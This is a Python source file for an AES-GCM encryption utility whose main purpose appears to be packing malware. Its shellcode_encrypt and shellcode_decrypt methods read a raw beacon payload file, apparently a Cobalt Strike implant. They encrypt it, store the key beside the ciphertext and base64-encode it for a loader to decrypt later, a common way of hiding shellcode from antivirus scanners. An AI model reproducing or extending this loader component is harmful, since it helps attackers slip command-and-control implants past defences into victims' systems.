import base64

from Crypto.Cipher import AES
from random import randint
import os

from common.project_path import project_path


class CryptoUtils:

    def __init__(self):
        self.key_len = 32
        self.key = self._gen_key(n=self.key_len)  # 默认密钥
        self.iv = os.urandom(12)

    def _gen_key(self, n=32):
        randkey = "qazwsxedcrfvtgbyhnujmikolp1234567890!@#$%^&*()<>?:\"{}QAZWSXEDCRFVTGBYHNUJMIKOLP"
        key = ""
        for x in range(n):
            key = key + randkey[randint(0, len(randkey)-1)]
        # logger.debug(f"key: {bytes(key, encoding='utf-8')}")
        return bytes(key, encoding="utf-8")

    def _pkcs7padding(self, plain_text_bytes):
        n = AES.block_size
        # print(n)
        # print(len(plain_text_bytes))
        free_len = n - len(plain_text_bytes) % n
        # print(f"free_len:{free_len}")
        # print(bytes.fromhex(free_len))

        # print(f"hex_str: {hex_str}")
        padding_chr = bytes(hex(free_len).encode())
        # print(padding_chr)
        plain_text_bytes += bytearray([free_len]) * free_len
        return plain_text_bytes

    def get_key(self):
        return self.key

    def encrypt(self, plaintext_raw):
        aes = AES.new(self.key, AES.MODE_GCM, self.iv)
        # plaintext_raw = self._pkcs7padding(plaintext_raw)
        plaintext_raw, tag = aes.encrypt_and_digest(plaintext_raw)
        # print(f" ciphertext, mac tag: {plaintext_raw}, {tag}")
        ciper = self.iv + plaintext_raw + tag
        # print(f"cipher: {ciper}")
        return ciper

    def unit_test(self,content):
        return self._pkcs7padding(plain_text_bytes=content)

    def decrypt(self, cipher_raw):
        aes = AES.new(self.key, AES.MODE_GCM, cipher_raw[:12])
        plain = aes.decrypt_and_verify(cipher_raw[12:-16],cipher_raw[-16:])
        # print(f"plain ： {plain}")
        return plain

    def shellcode_encrypt(self):
        with open("./bean_raw/beacon-new-profile.bin", "rb") as f:
            shellcode = f.read()
        shellcode_cipher = crypto_utils.get_key()
        shellcode_cipher += b"||split||"
        shellcode_cipher += crypto_utils.encrypt(shellcode)
        # print(shellcode_cipher)
        with open(project_path.get_project_path() + "./resource/shellcode_cipher.tmp", "wb") as f:
            f.write(base64.b64encode(shellcode_cipher))

    def shellcode_decrypt(self):
        with open(project_path.get_project_path() + "./resource/shellcode_cipher.tmp", "r") as f:
            shellcode_raw = f.read()
            shellcode = base64.b64decode(shellcode_raw)
            # print(shellcode)
            key, cipher = shellcode.split(b"||split||")
            crypto_utils.key = key
            plain_text_raw = crypto_utils.decrypt(cipher)
        return plain_text_raw


crypto_utils =  CryptoUtils()

if __name__ == '__main__':
    utils = CryptoUtils()
    a = utils.encrypt(plaintext_raw=b'asbudiuagsdiuas')
    print(utils.decrypt(a))

